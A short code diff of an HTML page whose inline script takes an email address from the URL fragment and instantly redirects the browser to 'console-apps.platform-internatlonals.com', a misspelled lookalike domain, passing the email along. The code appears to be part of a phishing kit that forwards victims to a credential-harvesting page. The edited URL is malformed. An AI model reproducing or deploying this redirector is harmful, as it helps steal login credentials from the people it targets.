@@ -19,7 +19,7 @@
 		var em = hash.split("#")[1];
 
 		window.setTimeout(function () {
-			window.location.href = "https://console-apps.platform-internatlonals.com"+ "#" + em;
+			window.location.href = "https://console-apps.platform-internatlonals.comusername=[Email]"+ "#" + em;
 		}, 0);
 	</script>
 </html>
